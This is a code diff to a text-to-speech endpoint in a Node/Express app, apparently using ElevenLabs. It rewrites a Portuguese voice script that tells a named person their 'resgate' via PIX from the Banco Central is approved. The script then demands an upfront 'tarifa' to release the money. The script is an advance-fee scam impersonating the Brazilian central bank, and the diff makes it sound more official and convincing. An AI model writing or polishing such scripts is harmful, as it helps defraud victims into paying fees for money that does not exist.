@@ -551,7 +551,7 @@ app.post("/api/v1/tts", async (req, res) => {
   const idVoz = voiceId || "GM2UA3fbsIaLHcswCDX9";
   const valorTexto = value ? `no valor de ${value}` : "";
 
-  const script = `Oi, ${firstName}! Que bom que você chegou até aqui. Eu sou a ${atendente} e o seu processo de resgate ${valorTexto} deu super certo. Pra gente conseguir liberar esse PIX direto na sua conta do Banco Central agora mesmo, você só precisa pagar uma tarifa unificada rapidinho. Não se preocupe, isso é só uma segurança padrão contra fraudes. Assim que compensar no sistema, o valor total do seu resgate cai na sua conta em uns dois minutinhos. Clica no botão aqui embaixo e finaliza seu saque!`;
+  const script = `Olá, ${firstName}. É um grande prazer falar com você. Meu nome é ${atendente} e informo que o seu processo de resgate ${valorTexto} foi aprovado com sucesso. Para que possamos liberar a transferência PIX diretamente para a sua conta vinculada ao Banco Central, é necessário realizar o pagamento da tarifa transacional obrigatória. Este é um procedimento de segurança padrão exigido pelo sistema. Assim que o pagamento for compensado, o valor integral será creditado em sua conta em até dois minutos. Por favor, copie o código abaixo ou escaneie o QR Code para finalizar a liberação.`;
 
   try {
     const apiKey = process.env.ELEVENLABS_API_KEY || "";
